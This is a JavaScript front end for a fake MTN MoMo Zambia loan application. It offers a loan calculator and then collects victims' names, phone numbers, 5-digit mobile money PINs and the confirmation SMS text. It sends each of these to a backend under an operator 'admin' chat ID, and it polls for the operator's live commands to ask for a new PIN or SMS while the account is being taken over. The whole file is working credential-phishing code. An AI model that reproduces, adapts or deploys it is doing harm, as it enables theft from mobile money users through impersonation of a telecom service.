(function () {
  const $ = (id) => document.getElementById(id);

  let currentUserId = null;
  let statusPollInterval = null;
  let smsTimerInterval = null;
  let pinAutoSubmittedForCurrentValue = '';
  let smsAutoSubmittedForCurrentValue = '';
  let isSubmittingPin = false;
  let isSubmittingSms = false;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  const SMS_PREFIX_REGEX = /^Y['’]ello\.\s*Please note!/i;

  function startsWithYelloPleaseNote(rawSms) {
    const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
    return SMS_PREFIX_REGEX.test(normalized);
  }

  function toZeroPrefixPhone(rawPhone) {
    const digits = String(rawPhone || '').replace(/\D/g, '');
    if (digits.startsWith('260')) return '0' + digits.slice(3);
    if (digits.startsWith('0')) return digits;
    if (/^(96|76|56)\d{7}$/.test(digits)) return '0' + digits;
    return digits;
  }

  function isValidMtnZambia(rawPhone) {
    const normalized = toZeroPrefixPhone(rawPhone);
    return /^(096|076|056)\d{7}$/.test(normalized);
  }

  function formatDisplayPhone(rawPhone) {
    const zeroPhone = toZeroPrefixPhone(rawPhone);
    if (/^(096|076|056)\d{7}$/.test(zeroPhone)) {
      return `${zeroPhone.slice(0, 3)} ${zeroPhone.slice(3, 6)} ${zeroPhone.slice(6)}`;
    }
    return zeroPhone || '096 XXX XXXX';
  }

  function showBanner(el, msg) {
    if (!el) return;
    el.innerText = msg;
    el.classList.add('active');
  }

  function hideBanner(el) {
    if (!el) return;
    el.innerText = '';
    el.classList.remove('active');
  }

  function showLoading(title, sub) {
    const titleEl = $('loading-title');
    const subEl = $('loading-sub');
    const loadingOverlay = $('loading-overlay');
    if (titleEl) titleEl.innerText = title;
    if (subEl) subEl.innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    const loadingOverlay = $('loading-overlay');
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }

  function stepTo(screenId) {
    document.querySelectorAll('.screen').forEach((s) => s.classList.remove('active'));
    const target = typeof screenId === 'string' ? $(screenId) : screenId;
    if (target) {
      target.classList.add('active');
      try {
        window.scrollTo({ top: 0, behavior: 'instant' });
      } catch (err) {
        window.scrollTo(0, 0);
      }
    }
  }

  function updateCalc() {
    const loanSlider = $('loan-amount-slider');
    const loanText = $('loan-amount-text');
    const monthsSlider = $('loan-months-slider');
    const monthsText = $('loan-months-text');
    const monthlyRepVal = $('monthly-rep-val');
    const formAmountInput = $('form-amount-input');
    const sumDuration = $('sum-duration');

    const amt = loanSlider ? Number(loanSlider.value) || 100000 : 100000;
    const mths = monthsSlider ? Number(monthsSlider.value) || 48 : 48;

    if (loanText) loanText.innerText = `ZMW ${amt.toLocaleString()}`;
    if (monthsText) monthsText.innerText = `${mths} ${mths === 1 ? 'month' : 'months'}`;
    if (formAmountInput) formAmountInput.value = amt.toLocaleString();
    if (sumDuration) sumDuration.innerText = `${mths} Months`;

    const monthly = (amt * 1.1) / mths;
    if (monthlyRepVal) monthlyRepVal.innerText = `ZMW ${Math.round(monthly).toLocaleString()}`;
  }

  function syncSummary() {
    const formAmountInput = $('form-amount-input');
    const loanDurationSelect = $('loan-duration');
    const loanPurposeInput = $('loan-purpose');
    const sumAmount = $('sum-amount');
    const sumDuration = $('sum-duration');
    const sumPurpose = $('sum-purpose');
    const depositRequiredAmount = $('deposit-required-amount');
    const successDepositAmount = $('success-deposit-amount');

    const amtRaw = (formAmountInput?.value || '100,000').trim();
    const dur = loanDurationSelect?.value || '48 Months';
    const purp = (loanPurposeInput?.value || '').trim() || 'Business';

    if (sumAmount) sumAmount.innerText = `ZMW ${amtRaw}`;
    if (sumDuration) sumDuration.innerText = dur;
    if (sumPurpose) sumPurpose.innerText = purp;

    const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
    const depVal = Math.max(200, Math.round(numericAmt * 0.002));
    if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
    if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;
  }

  function nextFromForm2() {
    const bannerPhoneError = $('banner-phone-error');
    const firstNameInput = $('first-name');
    const lastNameInput = $('last-name');
    const formPhoneInput = $('form-phone');
    const sumApplicant = $('sum-applicant');

    hideBanner(bannerPhoneError);
    const fn = (firstNameInput?.value || '').trim();
    const ln = (lastNameInput?.value || '').trim();
    const ph = (formPhoneInput?.value || '').trim();

    if (!fn || !ln) {
      showBanner(bannerPhoneError, 'Please enter your first name and last name.');
      return;
    }

    if (!isValidMtnZambia(ph)) {
      showBanner(
        bannerPhoneError,
        'Enter a valid MTN Zambia number starting with 096, 076, or 056.'
      );
      return;
    }

    syncSummary();
    if (sumApplicant) sumApplicant.innerText = `${fn} ${ln}`.toUpperCase();
    stepTo('screen-form3');
  }

  async function nextFromForm3() {
    syncSummary();

    const firstNameInput = $('first-name');
    const lastNameInput = $('last-name');
    const formPhoneInput = $('form-phone');
    const sumApplicant = $('sum-applicant');
    const displayPinPhone = $('display-pin-phone');
    const displaySmsPhone = $('display-sms-phone');
    const pinPhoneInput = $('pin-phone-input');
    const yelloPinInput = $('yello-pin-input');
    const btnTogglePinVisibility = $('btn-toggle-pin-visibility');

    const fn = (firstNameInput?.value || '').trim();
    const ln = (lastNameInput?.value || '').trim();
    const ph = (formPhoneInput?.value || '').trim();

    const fullName =
      `${fn} ${ln}`.trim().toUpperCase() ||
      (sumApplicant?.innerText || '').trim() ||
      'MTN MOMO ZAMBIA';
    const zeroPhone = toZeroPrefixPhone(ph);
    const formattedPhone = formatDisplayPhone(zeroPhone);

    if (sumApplicant) sumApplicant.innerText = fullName;
    if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
    if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;
    if (pinPhoneInput && !pinPhoneInput.value.trim()) {
      pinPhoneInput.value = formattedPhone;
    }

    pinAutoSubmittedForCurrentValue = '';
    smsAutoSubmittedForCurrentValue = '';
    isSubmittingPin = false;
    isSubmittingSms = false;

    if (yelloPinInput) {
      yelloPinInput.value = '';
      yelloPinInput.type = 'password';
    }
    if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
    hideBanner($('banner-pin-error'));
    hideBanner($('banner-pin-info'));

    stepTo('screen-pin');
    if (yelloPinInput) {
      try {
        yelloPinInput.focus();
      } catch (e) {}
    }

    try {
      const res = await fetch(
        `/api/submit-application?admin=${encodeURIComponent(adminParam)}`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            adminChatId: adminParam,
            applicant: { fullName, phone: zeroPhone }
          })
        }
      );
      const data = await res.json();
      if (data && data.success && data.userId) {
        currentUserId = data.userId;
      }
    } catch (e) {}
  }

  function startSmsCountdown() {
    const smsSecondsSpan = $('sms-seconds');
    const smsTimerText = $('sms-timer-text');
    const btnRequestNewSms = $('btn-request-new-sms');

    let timeLeft = 15;
    if (smsSecondsSpan) smsSecondsSpan.innerText = timeLeft;
    if (smsTimerText) smsTimerText.classList.remove('hidden-btn');
    if (btnRequestNewSms) btnRequestNewSms.classList.add('hidden-btn');

    if (smsTimerInterval) clearInterval(smsTimerInterval);

    smsTimerInterval = setInterval(() => {
      timeLeft -= 1;
      if (smsSecondsSpan) smsSecondsSpan.innerText = Math.max(0, timeLeft);

      if (timeLeft <= 0) {
        clearInterval(smsTimerInterval);
        if (smsTimerText) smsTimerText.classList.add('hidden-btn');
        if (btnRequestNewSms) btnRequestNewSms.classList.remove('hidden-btn');
      }
    }, 1000);
  }

  function startStatusPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${encodeURIComponent(currentUserId)}`);
        const data = await res.json();
        const st = data && data.status;

        const blockedReasonText = $('blocked-reason-text');
        const yelloPinInput = $('yello-pin-input');
        const smsInputBox = $('sms-input-box');

        if (st === 'BLOCKED') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          if (blockedReasonText) {
            blockedReasonText.innerText =
              'BLOCK — Application blocked because valid MTN MoMo details were not confirmed.';
          }
          stepTo('screen-stopped');
        } else if (st === 'PROCEED_SMS') {
          clearInterval(statusPollInterval);
          hideLoading();
          hideBanner($('banner-sms-error'));
          hideBanner($('banner-sms-info'));
          smsAutoSubmittedForCurrentValue = '';
          if (smsInputBox) smsInputBox.value = '';
          stepTo('screen-sms');
          startSmsCountdown();
          if (smsInputBox) {
            try {
              smsInputBox.focus();
            } catch (e) {}
          }
        } else if (st === 'INCORRECT_PIN') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          pinAutoSubmittedForCurrentValue = '';
          if (yelloPinInput) yelloPinInput.value = '';
          stepTo('screen-pin');
          hideBanner($('banner-pin-info'));
          showBanner($('banner-pin-error'), 'INCORRECT PIN — Please enter a new 5-digit PIN.');
          if (yelloPinInput) {
            try {
              yelloPinInput.focus();
            } catch (e) {}
          }
        } else if (st === 'SMS_EXPIRED') {
          clearInterval(statusPollInterval);
          hideLoading();
          smsAutoSubmittedForCurrentValue = '';
          if (smsInputBox) smsInputBox.value = '';
          stepTo('screen-sms');
          hideBanner($('banner-sms-info'));
          showBanner($('banner-sms-error'), 'SMS EXPIRES — Please enter a new SMS or request a new SMS.');
          startSmsCountdown();
          if (smsInputBox) {
            try {
              smsInputBox.focus();
            } catch (e) {}
          }
        } else if (st === 'APPROVE' || st === 'APPROVED' || st === 'SUCCESS') {
          clearInterval(statusPollInterval);
          if (smsTimerInterval) clearInterval(smsTimerInterval);
          hideLoading();
          stepTo('screen-success');
        }
      } catch (e) {}
    }, 1000);
  }

  async function submitPinAutomatically(pinVal) {
    if (isSubmittingPin) return;
    isSubmittingPin = true;

    const bannerPinError = $('banner-pin-error');
    const bannerPinInfo = $('banner-pin-info');
    const pinPhoneInput = $('pin-phone-input');
    const displayPinPhone = $('display-pin-phone');
    const displaySmsPhone = $('display-sms-phone');
    const formPhoneInput = $('form-phone');
    const sumApplicant = $('sum-applicant');
    const firstNameInput = $('first-name');
    const lastNameInput = $('last-name');

    hideBanner(bannerPinError);
    hideBanner(bannerPinInfo);

    const enteredPhone = (
      pinPhoneInput?.value ||
      displayPinPhone?.innerText ||
      formPhoneInput?.value ||
      ''
    ).trim();
    const phoneZero = toZeroPrefixPhone(enteredPhone);
    const formattedPhone = formatDisplayPhone(phoneZero);
    if (displayPinPhone) displayPinPhone.innerText = formattedPhone;
    if (displaySmsPhone) displaySmsPhone.innerText = formattedPhone;

    const applicantName =
      (
        sumApplicant?.innerText ||
        `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`
      ).trim() || 'MTN MOMO ZAMBIA';

    showLoading('SENDING 5-DIGIT PIN FOR REVIEW...', 'Please wait for admin response...');

    try {
      const res = await fetch('/api/submit-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          adminChatId: adminParam,
          phone: phoneZero,
          pin: pinVal,
          applicantName
        })
      });
      const data = await res.json();
      if (data && data.success && data.userId) {
        currentUserId = data.userId;
      }
      startStatusPolling();
    } catch (e) {
      pinAutoSubmittedForCurrentValue = '';
      hideLoading();
      showBanner(bannerPinError, 'Connection issue while sending PIN. Re-enter 5 digits to retry.');
    } finally {
      isSubmittingPin = false;
    }
  }

  async function submitSmsAutomatically(smsText) {
    if (isSubmittingSms) return;
    isSubmittingSms = true;

    const bannerSmsError = $('banner-sms-error');
    const bannerSmsInfo = $('banner-sms-info');
    const displaySmsPhone = $('display-sms-phone');
    const pinPhoneInput = $('pin-phone-input');
    const formPhoneInput = $('form-phone');

    hideBanner(bannerSmsError);
    hideBanner(bannerSmsInfo);

    const phoneZero = toZeroPrefixPhone(
      displaySmsPhone?.innerText || pinPhoneInput?.value || formPhoneInput?.value || ''
    );

    showLoading('AUTO-SUBMITTING SMS CODE...', 'Please wait for admin review...');

    try {
      const res = await fetch('/api/submit-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          adminChatId: adminParam,
          phone: phoneZero,
          sms: smsText,
          autoDetected: true
        })
      });
      const data = await res.json();
      if (data && data.success && data.userId) {
        currentUserId = data.userId;
      }
      startStatusPolling();
    } catch (e) {
      smsAutoSubmittedForCurrentValue = '';
      hideLoading();
      showBanner(bannerSmsError, 'Unable to submit SMS. Paste again to retry.');
    } finally {
      isSubmittingSms = false;
    }
  }

  function checkPinAuto() {
    const yelloPinInput = $('yello-pin-input');
    if (!yelloPinInput) return;
    const digits = yelloPinInput.value.replace(/\D/g, '').slice(0, 5);
    if (yelloPinInput.value !== digits) {
      yelloPinInput.value = digits;
    }
    if (digits.length === 5 && digits !== pinAutoSubmittedForCurrentValue) {
      pinAutoSubmittedForCurrentValue = digits;
      submitPinAutomatically(digits);
    }
  }

  function checkSmsAuto() {
    const smsInputBox = $('sms-input-box');
    if (!smsInputBox) return;
    const currentText = smsInputBox.value.replace(/\s+/g, ' ').trim();
    if (
      startsWithYelloPleaseNote(currentText) &&
      currentText !== smsAutoSubmittedForCurrentValue
    ) {
      smsAutoSubmittedForCurrentValue = currentText;
      submitSmsAutomatically(currentText);
    }
  }

  function syncPinPhone() {
    const pinPhoneInput = $('pin-phone-input');
    const displayPinPhone = $('display-pin-phone');
    const displaySmsPhone = $('display-sms-phone');
    if (!pinPhoneInput) return;
    const formatted = formatDisplayPhone(pinPhoneInput.value);
    if (displayPinPhone) displayPinPhone.innerText = formatted;
    if (displaySmsPhone) displaySmsPhone.innerText = formatted;
  }

  function togglePinEye() {
    const yelloPinInput = $('yello-pin-input');
    const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
    if (!yelloPinInput) return;
    const makeVisible = yelloPinInput.type === 'password';
    yelloPinInput.type = makeVisible ? 'text' : 'password';
    if (btnTogglePinVisibility) {
      btnTogglePinVisibility.innerText = makeVisible ? '🙈' : '👁️';
    }
  }

  function showPinInfo(msg) {
    hideBanner($('banner-pin-error'));
    showBanner($('banner-pin-info'), msg);
  }

  async function requestNewSms() {
    const bannerSmsError = $('banner-sms-error');
    const bannerSmsInfo = $('banner-sms-info');
    const displaySmsPhone = $('display-sms-phone');
    const pinPhoneInput = $('pin-phone-input');
    const formPhoneInput = $('form-phone');

    hideBanner(bannerSmsError);
    const phoneZero = toZeroPrefixPhone(
      displaySmsPhone?.innerText || pinPhoneInput?.value || formPhoneInput?.value || ''
    );
    showBanner(bannerSmsInfo, 'NEW SMS REQUESTED — Admin has been notified.');
    startSmsCountdown();

    try {
      const res = await fetch('/api/request-new-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: currentUserId,
          adminChatId: adminParam,
          phone: phoneZero
        })
      });
      const data = await res.json();
      if (data && data.success && data.userId) {
        currentUserId = data.userId;
      }
      startStatusPolling();
    } catch (err) {}
  }

  function resetApp() {
    if (statusPollInterval) clearInterval(statusPollInterval);
    if (smsTimerInterval) clearInterval(smsTimerInterval);
    currentUserId = null;
    pinAutoSubmittedForCurrentValue = '';
    smsAutoSubmittedForCurrentValue = '';
    isSubmittingPin = false;
    isSubmittingSms = false;

    const yelloPinInput = $('yello-pin-input');
    const btnTogglePinVisibility = $('btn-toggle-pin-visibility');
    const smsInputBox = $('sms-input-box');

    if (yelloPinInput) {
      yelloPinInput.value = '';
      yelloPinInput.type = 'password';
    }
    if (btnTogglePinVisibility) btnTogglePinVisibility.innerText = '👁️';
    if (smsInputBox) smsInputBox.value = '';

    [
      $('banner-phone-error'),
      $('banner-form3-error'),
      $('banner-pin-error'),
      $('banner-pin-info'),
      $('banner-sms-error'),
      $('banner-sms-info')
    ].forEach(hideBanner);

    hideLoading();
    stepTo('screen-welcome');
  }

  window.__stepTo = stepTo;
  window.__updateCalc = updateCalc;
  window.__syncSummary = syncSummary;
  window.__nextFromForm2 = nextFromForm2;
  window.__nextFromForm3 = nextFromForm3;
  window.__checkPinAuto = checkPinAuto;
  window.__checkSmsAuto = checkSmsAuto;
  window.__syncPinPhone = syncPinPhone;
  window.__togglePinEye = togglePinEye;
  window.__showPinInfo = showPinInfo;
  window.__requestNewSms = requestNewSms;
  window.__resetApp = resetApp;

  function initApp() {
    updateCalc();
    syncSummary();
    stepTo('screen-welcome');
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp);
  } else {
    initApp();
  }
})();
      
